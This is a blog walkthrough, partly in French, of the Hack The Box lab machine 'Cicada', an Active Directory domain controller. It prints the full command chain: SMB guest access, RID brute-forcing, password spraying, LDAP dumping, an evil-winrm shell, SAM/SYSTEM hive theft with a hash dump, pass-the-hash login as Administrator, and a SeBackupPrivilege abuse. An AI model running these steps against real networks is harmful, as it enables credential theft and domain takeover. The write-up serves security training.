<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Cicada</title>
<meta name=description content="Platforme: Hack The Box Lien: Cicada Niveau: Facile OS: Windows Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-cicada/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Cicada"><meta property="og:description" content="Platforme: Hack The Box Lien: Cicada Niveau: Facile OS: Windows Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Cicada/Cicada.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Cicada/Cicada.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Cicada"><meta name=twitter:description content="Platforme: Hack The Box Lien: Cicada Niveau: Facile OS: Windows Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-cicada/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-cicada/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Cicada/Cicada.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-cicada/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-cicada/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Cicada</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>13 Février 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Cicada>Cicada</a></li><li>Niveau: Facile</li><li>OS: Windows</li></ul><hr><p>Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter via SMB avec le compte invité, ce qui nous permet de récupérer une note contenant un mot de passe. Grâce à une attaque par force brute RID, nous énumérons les noms d&rsquo;utilisateurs du domaine et découvrons des identifiants valides, que nous utilisons pour nous connecter via LDAP. Une énumération plus poussée révèle un mot de passe stocké dans le champ de description d&rsquo;un utilisateur, ce qui permet d&rsquo;accéder à un autre partage SMB contenant un script PowerShell avec des informations d&rsquo;identification supplémentaires. Nous les utilisons pour obtenir un accès initial au système via WinRM. L&rsquo;utilisateur compromis possède le privilège <code>SeBackupPrivilege</code> et est membre du groupe <code>Backup Operators</code>, ce qui offre deux façons distinctes d&rsquo;exploiter la cible.</p><p>Addresse IP cible - <code>10.10.11.35</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -p- -sC -sV -Pn 10.10.11.35
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-12 23:27 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> cicada.htb <span style=color:#56b6c2>(</span>10.10.11.35<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.059s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65523</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2025-01-13 12:32:02Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style=display:flex><span>|_Not valid after:  2025-08-22T20:24:16
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style=display:flex><span>|_Not valid after:  2025-08-22T20:24:16
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style=display:flex><span>|_Not valid after:  2025-08-22T20:24:16
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>57002/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: 7h00m01s
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2025-01-13T12:32:54
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 356.76 seconds
</span></span></code></pre></div><p>Notre cible est un contrôleur de domaine Active Directory. Mettons à jour le fichier <code>/etc/hosts</code> selon les résultats de nmap.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.35 cicada.htb cicada.htb0 CICADA-DC.cicada.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Commençons par SMB.</p><pre tabindex=0><code>smbclient -N -L cicada.htb
</code></pre><p><img src=/images/HTB-Cicada/smbclient_cmd.png alt="SMB shares list"></p><p>Nous remarquons différents partages tels que <code>HR</code> et <code>DEV</code>. Nous pouvons essayer de nous connecter avec un compte <code>Guest</code> afin de trouver plus d&rsquo;informations.</p><pre tabindex=0><code>netexec smb cicada.htb -u Guest -p &#34;&#34; --shares
</code></pre><p><img src=/images/HTB-Cicada/shares_list.png alt="SMB guest login"></p><p>Nous pouvons lire les partages: <code>HR</code> et <code>IPC$</code> ( partage par défaut).</p><pre tabindex=0><code>smbclient //cicada.htb/HR
</code></pre><p><img src=/images/HTB-Cicada/HR_share.png alt="HR share content"></p><p>Nous trouvons un fichier appelé <code>Notice from HR.txt</code> et le téléchargeons. Il contient un mot de passe : <code>Cicada$M6Corpb*@Lp#nZp!8</code>.</p><p><img src=/images/HTB-Cicada/notice_from_HR.png alt="Password found in HR share"></p><p>Nous avons maintenant besoin d&rsquo;un nom d&rsquo;utilisateur, nous pouvons trouver les noms d&rsquo;utilisateurs du domaine via le RID brute forcing.</p><pre tabindex=0><code>netexec smb cicada.htb -u guest -p &#39;&#39; --rid-brute
</code></pre><p>Après l&rsquo;extraction des noms d&rsquo;utilisateur, nous obtenons la liste suivante.</p><p><img src=/images/HTB-Cicada/accounts.png alt="SMB accounts"></p><pre tabindex=0><code>Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
</code></pre><p><img src=/images/HTB-Cicada/usernames.png alt="SMB usernames list"></p><p>Nous comparons le mot de passe à notre liste de noms d&rsquo;utilisateurs, et nous trouvons une correspondance pour <code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code>.</p><pre tabindex=0><code>netexec smb cicada.htb -u users.txt -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --continue-on-success
</code></pre><p><img src=/images/HTB-Cicada/creds_match.png alt="SMB credentials match"></p><p>Utilisons les nouveaux identifiants pour nous connecter via SMB.</p><pre tabindex=0><code>netexec smb cicada.htb -u michael.wrightson -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares
</code></pre><p><img src=/images/HTB-Cicada/micheal_smb.png alt="michael.wrightson available shares"></p><p>Cet utilisateur a accès aux partages <code>NETLOGON</code> et <code>SYSVOL</code> en plus des deux partages précédents observés plus tôt. Malheureusement, aucun d&rsquo;entre eux ne contient d&rsquo;informations utiles.</p><p>Essayons de nous authentifier via LDAP.</p><pre tabindex=0><code>netexec ldap cicada.htb -u michael.wrightson -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;
</code></pre><p><img src=/images/HTB-Cicada/LDAP_auth_michael.png alt="LDAP authentication michael.wrightson"></p><p>L&rsquo;authentification est un succès! Nous pouvons obtenir plus d&rsquo;informations avec <code>ldapdomaindump</code>.</p><pre tabindex=0><code>ldapdomaindump 10.10.11.35 -u &#39;cicada\michael.wrightson&#39; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;
</code></pre><p><img src=/images/HTB-Cicada/ldapdomaindump.png alt=ldapdomaindump></p><p>Dans <code>domain_users.html</code> nous remarquons que <code>david.orelious</code> a laissé son mot de passe (<code>aRt$Lp#7t*VQ!3</code>) dans la description.</p><p><img src=/images/HTB-Cicada/david_pwd.png alt="david.orelious password found"></p><hr><p>Il est également possible d&rsquo;utiliser <code>ldapsearch</code> pour obtenir le mot de passe.</p><p>Nous commençons par lister toutes les informations concernant le domaine.</p><pre tabindex=0><code>ldapsearch -H ldap://cicada.htb -D &#39;michael.wrightson@cicada.htb&#39; -w &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -b &#39;dc=cicada,dc=htb&#39;
</code></pre><p>La commande suivante permet d&rsquo;afficher tous les noms d&rsquo;utilisateurs du domaine.</p><pre tabindex=0><code>ldapsearch -H ldap://cicada.htb -D &#39;michael.wrightson@cicada.htb&#39; -w &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -b &#39;dc=cicada,dc=htb&#39; &#34;(objectClass=person)&#34; | grep &#34;sAMAccountName:&#34;
</code></pre><p><img src=/images/HTB-Cicada/ldapsearch_domain_names.png alt="ldapsearch finds domain names"></p><p>Nous tentons de trouver quelques mots de passe à l&rsquo;aide de la commande ci-dessous.</p><pre tabindex=0><code>ldapsearch -H ldap://cicada.htb -D &#39;michael.wrightson@cicada.htb&#39; -w &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -b &#39;dc=cicada,dc=htb&#39; | grep pass
</code></pre><p><img src=/images/HTB-Cicada/ldapsearch_pwdfind.png alt="ldapsearch finds passwords"></p><p>Ensuite, nous comparons la liste des utilisateurs au nouveau mot de passe trouvé.</p><pre tabindex=0><code>netexec smb cicada.htb -u users.txt -p &#39;aRt$Lp#7t*VQ!3&#39; --continue-on-success
</code></pre><p><img src=/images/HTB-Cicada/pwd_match.png alt="ldap password match"></p><p>Nous savons maintenant que le mot de passe <code>aRt$Lp#7t*VQ!3</code> appartient à <code>david.orelious</code>.</p><hr><p>Avec ces nouveaux identifiants, nous énumérons à nouveau le SMB.</p><pre tabindex=0><code>netexec smb cicada.htb -u david.orelious -p &#39;aRt$Lp#7t*VQ!3&#39; --shares
</code></pre><p><img src=/images/HTB-Cicada/david_smb.png alt="david.orelious available shares"></p><p>Cet utilisateur a accès au partage <code>DEV</code>.</p><pre tabindex=0><code>smbclient //cicada.htb/DEV -U david.orelious
</code></pre><p><img src=/images/HTB-Cicada/DEV_share.png alt="DEV share accessed"></p><p>Le partage <code>DEV</code> contient un fichier appelé <code>Backup_script.ps1</code> que nous téléchargeons. Son contenu est le suivant:</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PowerShell data-lang=PowerShell><span style=display:flex><span><span style=color:#e06c75>$sourceDirectory</span> = <span style=color:#98c379>&#34;C:\smb&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$destinationDirectory</span> = <span style=color:#98c379>&#34;D:\Backup&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$username</span> = <span style=color:#98c379>&#34;emily.oscars&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$password</span> = <span style=color:#e5c07b>ConvertTo-SecureString</span> <span style=color:#98c379>&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> <span style=color:#e06c75>-AsPlainText</span> <span style=color:#e06c75>-Force</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$credentials</span> = <span style=color:#e5c07b>New-Object</span> <span style=color:#e06c75>System</span>.<span style=color:#e06c75>Management</span>.<span style=color:#e06c75>Automation</span>.<span style=color:#e06c75>PSCredential</span>(<span style=color:#e06c75>$username</span>, <span style=color:#e06c75>$password</span>)
</span></span><span style=display:flex><span><span style=color:#e06c75>$dateStamp</span> = <span style=color:#e5c07b>Get-Date</span> <span style=color:#e06c75>-Format</span> <span style=color:#98c379>&#34;yyyyMMdd_HHmmss&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$backupFileName</span> = <span style=color:#98c379>&#34;smb_backup_</span><span style=color:#e06c75>$dateStamp</span><span style=color:#98c379>.zip&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$backupFilePath</span> = <span style=color:#e5c07b>Join-Path</span> <span style=color:#e06c75>-Path</span> <span style=color:#e06c75>$destinationDirectory</span> <span style=color:#e06c75>-ChildPath</span> <span style=color:#e06c75>$backupFileName</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>Compress-Archive</span> <span style=color:#e06c75>-Path</span> <span style=color:#e06c75>$sourceDirectory</span> <span style=color:#e06c75>-DestinationPath</span> <span style=color:#e06c75>$backupFilePath</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>Write-Host</span> <span style=color:#98c379>&#34;Backup completed successfully. Backup file saved to: </span><span style=color:#e06c75>$backupFilePath</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><h2 id=shell-en-tant-que-emilyoscars>Shell en tant que emily.oscars</h2><p>The script has the password (<code>Q!3@Lp#M6b*7t*Vt</code>) of <code>emily.oscars</code>. With the result of our nmap scan we can see that winrm is running on port 5985. So let&rsquo;s check if we can login with it.</p><p>Make a list with the three passwords we have so far and run it against the user names list.</p><pre tabindex=0><code>netexec winrm cicada.htb -u users.txt -p passwords.txt
</code></pre><p><img src=/images/HTB-Cicada/winrm_valid.png alt="WinRM valid credentials"></p><p><code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code> are the only valid credentials.</p><pre tabindex=0><code>evil-winrm -i cicada.htb -u emily.oscars -p &#39;Q!3@Lp#M6b*7t*Vt&#39;
</code></pre><p><img src=/images/HTB-Cicada/foothold.png alt="emily.oscars WinRM login"></p><p>The user flag is readable at <code>C:\Users\emily.oscars.CICADA\Desktop\user.txt</code>.</p><p>We can see that <code>emily.oscars</code> has the <code>SeBackupPrivilege</code> and with <code>net user emily.oscars</code> we learn that she is a member of the <code>Backup Operators</code> group.</p><blockquote><p>While members of the <strong>Backup Operators group</strong> are inherently granted the <strong>SeBackupPrivilege</strong> by default, the reverse is not always true. A user can have the <strong>SeBackupPrivilege</strong> without being a member of the <strong>Backup Operators</strong> group because privileges in Windows can be assigned explicitly to users or groups independently of group membership.</p></blockquote><p><img src=/images/HTB-Cicada/backup_operators_group.png alt="emily.oscars group membership"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Because the current user we control has the <code>SeBackupPrivilege</code> and is a member of the <code>Backup Operators group</code> we can access the root flag via two different methods.</p><h3 id=méthode-hash-dump>Méthode Hash Dump</h3><p>This <a href=https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/>article</a> demonstrates how to abuse <code>SeBackupPrivilege</code>.</p><p>Within the <code>emily.oscars</code> shell execute the following commands</p><pre tabindex=0><code>mkdir Temp
</code></pre><p><img src=/images/HTB-Cicada/Temp_dir.png alt="Temp directory creation"></p><pre tabindex=0><code>reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
</code></pre><p><img src=/images/HTB-Cicada/sam_&_system.png alt="SAM & SYSTEM registries"></p><pre tabindex=0><code>cd Temp
download sam
download system
</code></pre><p><img src=/images/HTB-Cicada/dl_files.png alt="Registry files download"></p><p>On our local machine we dump the admin hash with the following command.</p><pre tabindex=0><code>impacket-secretsdump -sam sam -system system local
</code></pre><p><img src=/images/HTB-Cicada/hash_dump.png alt="impacket hash dump"></p><blockquote><p><code>pypykatz</code> can also be used to dump the hashes with the command <code>pypykatz registry --sam sam system</code>.</p></blockquote><p>We can now login as the Administrator and read the root flag.</p><pre tabindex=0><code>evil-winrm -i cicada.htb -u Administrator -H &#39;2b87e7c93a3e8a0ea4a581937016f341&#39;
</code></pre><p><img src=/images/HTB-Cicada/root_flag.png alt="Administrator login via EvilWinRM"></p><h3 id=attaque-locale>Attaque Locale</h3><p>You can also use the method available <a href=https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators>here</a>. You will need to go to <a href=https://github.com/giuliano108/SeBackupPrivilege>this</a> Github repo to get <code>SeBackupPrivilegeUtils.dll</code> and <code>SeBackupPrivilegeCmdLets.dll</code>.</p><ol><li>After cloning the repo we send the files to the target via our evil-winrm shell.</li></ol><pre tabindex=0><code>upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
</code></pre><p><img src=/images/HTB-Cicada/SeBackup_files.png alt="SeBackup files"></p><ol start=2><li>Import the libraries</li></ol><pre tabindex=0><code>Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
</code></pre><p><img src=/images/HTB-Cicada/Modules_Import.png alt="Modules Import"></p><ol start=3><li>Copy the root flag</li></ol><pre tabindex=0><code>Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\Documents\root.txt
</code></pre><p><img src=/images/HTB-Cicada/copy_root_flag.png alt="root flag copied"></p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/thm-you-got-mail/>&#8592;
Précédent:
THM: You Got Mail</a></p><p class=prev-post-date>février 9, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#shell-en-tant-que-emilyoscars>Shell en tant que emily.oscars</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#méthode-hash-dump>Méthode Hash Dump</a></li><li><a href=#attaque-locale>Attaque Locale</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>